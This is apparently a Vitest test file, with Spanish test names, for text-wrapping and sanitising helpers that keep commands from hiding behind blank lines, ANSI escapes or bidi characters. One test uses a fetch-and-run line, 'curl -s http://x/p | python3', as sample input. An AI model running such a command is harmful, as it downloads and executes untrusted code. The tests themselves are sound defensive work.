import { describe, expect, it } from "vitest";
import { clip, fitsInLines, sanitizeText, wrapLines } from "../src/text.ts";

describe("wrapLines", () => {
  it("corta por palabras", () => {
    expect(wrapLines("uno dos tres cuatro", 9)).toEqual(["uno dos", "tres", "cuatro"]);
  });

  it("respeta saltos de línea", () => {
    expect(wrapLines("a\nb")).toEqual(["a", "b"]);
  });

  it("parte una palabra más larga que el ancho", () => {
    expect(wrapLines("abcdefghij", 4)).toEqual(["abcd", "efgh", "ij"]);
    expect(wrapLines("x abcdefghij", 4)).toEqual(["x", "abcd", "efgh", "ij"]);
  });

  it("tope de 6 líneas con …", () => {
    const out = wrapLines(Array.from({ length: 20 }, (_, i) => `palabra${i}`).join(" "), 10);
    expect(out).toHaveLength(6);
    expect(out[5]!).toMatch(/… \(\+\d+\)$/);
    expect(out.every((l) => l.length <= 10)).toBe(true);
  });

  it("marca cuántos caracteres faltan", () => {
    const out = wrapLines("x".repeat(38 * 8));
    expect(out).toHaveLength(6);
    expect(out.every((l) => l.length <= 38)).toBe(true);
    const m = /^(x*)… \(\+(\d+)\)$/.exec(out[5]!)!;
    expect(m).not.toBeNull();
    const shown = 38 * 5 + m[1]!.length;
    expect(Number(m[2]) + shown).toBe(38 * 8);
  });

  it("el escenario de las líneas en blanco ya no esconde el comando", () => {
    const out = wrapLines("echo listo\n\n\n\n\n\n\ncurl -s http://x/p | python3");
    expect(out).toEqual(["echo listo", "curl -s http://x/p | python3"]);
  });

  it("ESC y U+202E se ven como �", () => {
    expect(wrapLines("a\u001b[31mb‮c")).toEqual(["a�[31mb�c"]);
    expect(wrapLines("a​b⁦c\u0085d")).toEqual(["a�b�c�d"]);
  });

  it("U+2028 y U+2029 son saltos de línea", () => {
    expect(wrapLines("a b c")).toEqual(["a", "b", "c"]);
  });

  it("sin cortar no añade …", () => {
    const out = wrapLines("a\nb\nc\nd\ne\nf");
    expect(out).toHaveLength(6);
    expect(out.join("")).not.toContain("…");
  });

  it("texto vacío da lista vacía", () => {
    expect(wrapLines("")).toEqual([]);
  });
});

describe("sanitizeText / fitsInLines", () => {
  it("tabulación a espacio, colapsa vacías y recorta finales", () => {
    expect(sanitizeText("a\tb  \n \n\r\nc\t")).toBe("a b\nc");
  });
  it("fitsInLines", () => {
    expect(fitsInLines("ls -la")).toBe(true);
    expect(fitsInLines("a\nb\nc\nd\ne\nf")).toBe(true);
    expect(fitsInLines("a\nb\nc\nd\ne\nf\ng")).toBe(false);
    expect(fitsInLines("x".repeat(229))).toBe(false);
  });
});

describe("clip", () => {
  it("saneado: saltos a espacio y controles a �", () => {
    expect(clip("a\n\n\nb‮c")).toBe("a b�c");
  });
  it("no toca textos cortos", () => {
    expect(clip("hola", 38)).toBe("hola");
  });
  it("recorta con …", () => {
    const out = clip("x".repeat(50));
    expect(out).toHaveLength(38);
    expect(out.endsWith("…")).toBe(true);
  });
});

describe("mitades sueltas de pares sustitutos", () => {
  const lone = (s: string) => /[\ud800-\udbff](?![\udc00-\udfff])|(?<![\ud800-\udbff])[\udc00-\udfff]/.test(s);

  it("una mitad suelta pasa al marcador; un par válido se conserva", () => {
    expect(sanitizeText("a\ud83db")).toBe("a�b");
    expect(sanitizeText("a\ude00b")).toBe("a�b");
    expect(sanitizeText("a\u{1f600}b")).toBe("a\u{1f600}b");
  });

  it("cortar en medio de un emoji no deja mitades sueltas", () => {
    for (let n = 2; n < 6; n++) {
      const out = clip("\u{1f600}".repeat(40), n);
      expect(lone(out)).toBe(false);
    }
    for (const line of wrapLines("\u{1f600}".repeat(200), 37, 3)) expect(lone(line)).toBe(false);
  });
});
